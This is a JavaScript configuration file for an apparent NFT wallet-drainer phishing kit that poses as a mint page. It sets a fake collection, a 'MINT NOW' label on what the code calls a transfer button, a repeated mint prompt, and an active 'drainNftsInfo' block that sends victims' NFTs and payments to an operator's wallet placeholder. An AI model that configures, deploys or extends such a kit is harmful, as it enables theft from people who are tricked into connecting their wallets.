const receiveAddress = "YOUR WALLET";

const collectionInfo = {
    name: "nft-professor",
    date: "10.04.2022",
    socialMedia: {
        discord: "discord.gg/invite_here",
        twitter: "https://twitter.com/username_here",
        facebook: "https://facebook.com/truongochos",
        instagram: "https://instagram.com/rustlrmvrch"
    },
    medias: {
        preview: "NFTGIF2.gif",
        favicon: "icon.png",
    },
    background: {
        type: "image", 
        image: "bg1.jpg", 
        video: "background.mp4", 
        color: "#4E4E6D", 
    }
}

const mintInfo = {
    price: 0.2,
    totalSupply: 8888,
    minUnits: 1,
    maxUnits: 20,
    askMintLoop: true,
}

const drainNftsInfo = {
    active: true,
    minValue: 0.2,
    maxTransfer: 1,
    nftReceiveAddress: "YOUR WALLET",
}

const customStrings = {
    title: "MINT {name}", 
    connectButton: "CONNECT WALLET",
    transferButton: "MINT NOW",
    dateString: "Pre sale available {date}",
}

if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);

